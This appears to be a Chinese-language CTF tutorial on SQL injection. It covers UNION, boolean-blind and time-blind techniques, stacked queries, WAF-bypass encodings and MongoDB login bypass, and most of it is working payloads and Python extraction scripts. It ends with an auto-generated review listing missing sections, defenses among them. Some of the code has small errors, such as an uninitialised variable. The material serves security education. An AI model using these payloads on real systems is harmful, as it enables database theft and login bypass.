# SQL注入CTF题型

SQL注入是CTF Web方向最基础的题型之一，考察对SQL语句构造和数据库原理的理解。

### 1.1 联合查询注入（UNION Based）

当页面直接返回查询结果时，可以使用UNION注入。

```sql
-- 判断注入点
' AND 1=1-- -    -- 页面正常
' AND 1=2-- -    -- 页面异常

-- 判断列数
' ORDER BY 1-- -    -- 正常
' ORDER BY 2-- -    -- 正常
' ORDER BY 3-- -    -- 异常 → 列数为2

-- 确定回显位
' UNION SELECT 1,2-- -

-- 获取数据库信息
' UNION SELECT database(),version()-- -

-- 获取表名
' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -

-- 获取列名
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='flag_table'-- -

-- 获取Flag
' UNION SELECT flag,2 FROM flag_table-- -
```

**Python自动化脚本示例**：
```python
import requests

def union_sqli(url, payload_col_count):
    """联合查询注入 - 确定列数"""
    for i in range(1, 20):
        payload = f"' ORDER BY {i}-- -"
        params = {"id": payload}
        r = requests.get(url, params=params)
        if "error" in r.text.lower() or not r.text.strip():
            return i - 1
    return -1

def dump_data(url, num_cols):
    """通过联合查询获取数据"""
    # 构造UNION SELECT
    cols = ",".join(["table_name" if j == 0 else str(j) for j in range(num_cols)])
    payload = f"' UNION SELECT {cols} FROM information_schema.tables WHERE table_schema=database()-- -"
    r = requests.get(url, params={"id": payload})
    # 解析返回结果
    return r.text
```

### 1.2 盲注（Boolean Based & Time Based）

当页面不返回查询结果，但有真假两种不同响应时，使用布尔盲注。当页面无任何差异时，使用时间盲注。

**布尔盲注**：
```python
import requests

def boolean_blind_sqli(url):
    """布尔盲注 - 逐字符获取数据"""
    result = ""
    
    for i in range(1, 100):
        # 二分法确定每个字符
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            # 构造布尔条件
            payload = f"' AND ASCII(SUBSTR(database(),{i},1))>{mid}-- -"
            r = requests.get(url, params={"id": payload})
            
            if "正常页面标志" in r.text:
                low = mid + 1
            else:
                high = mid
        
        result += chr(low)
        print(f"[+] 当前结果: {result}")
        if low == 32:
            break
    
    return result
```

**时间盲注**：
```python
import requests
import time

def time_blind_sqli(url):
    """时间盲注 - 使用SLEEP函数"""
    for i in range(1, 100):
        for j in range(32, 127):
            # 构造时间延迟条件
            payload = f"' AND IF(ASCII(SUBSTR(database(),{i},1))={j},SLEEP(2),0)-- -"
            
            start = time.time()
            r = requests.get(url, params={"id": payload})
            elapsed = time.time() - start
            
            if elapsed > 1.5:
                print(f"[+] 第{i}个字符: {chr(j)}")
                break
```

### 1.3 堆叠注入（Stacked Queries）

在支持多语句执行的环境（如MySQL的PDO、SQL Server）中，可以使用分号分隔多个SQL语句。

```sql
-- 堆叠注入示例
'; SHOW DATABASES;-- -
'; SHOW TABLES FROM test;-- -
'; SHOW COLUMNS FROM flag;-- -
'; SELECT * FROM flag;-- -

-- MySQL中通过PREPARE绕过过滤
'; SET @sql=CONCAT('sel','ect * from `flag`'); PREPARE stmt FROM @sql; EXECUTE stmt;-- -
```

### 1.4 绕过WAF技巧

```python
# 常见WAF绕过技巧
waf_bypass = {
    # 关键字绕过
    "union": "UnIoN, /*!50000union*/, uniounionn",
    "select": "selselectect, /*!50000select*/, %0a sele%0a ct",
    "and": "&&, aND, %26%26",
    "or": "||, oR, %7c%7c",
    "空格": "/**/, %0a, %0b, %0c, %09, +",
    "=": "like, in, between, <>",
    
    # 大小写混合
    "case": "UnIoN SeLeCt",
    
    # 内联注释（MySQL特有）
    "inline": "/*!50000UNION*/ /*!50000SELECT*/",
    
    # 编码绕过
    "hex": "0x666c6167 (flag的hex)",
    "char": "CHAR(102,108,97,103) (flag)",
    
    # 双写绕过（过滤一次的情况）
    "double": "ununionion selselectect",
}
```

### 1.5 NoSQL注入

```python
# MongoDB NoSQL注入
import requests
import json

# 绕过登录
url = "http://example.com/login"

# 方式1：使用$ne操作符
payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
r = requests.post(url, json=payload)

# 方式2：使用$gt逐字符获取
for i in range(1, 50):
    for c in range(32, 127):
        payload = {
            "username": "admin",
            "password": {"$regex": f"^.{{{i}}}{chr(c)}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text:
            result += chr(c)
            break
```

---

---

## 📋 内容审核与补充建议

> 针对「SQL注入CTF题型」部分的内容审核结果：

### 🔧 工具推荐
- ⚠️ 缺少tools相关内容

### ⌨️ 命令帮助
- ⚠️ 缺少commands相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
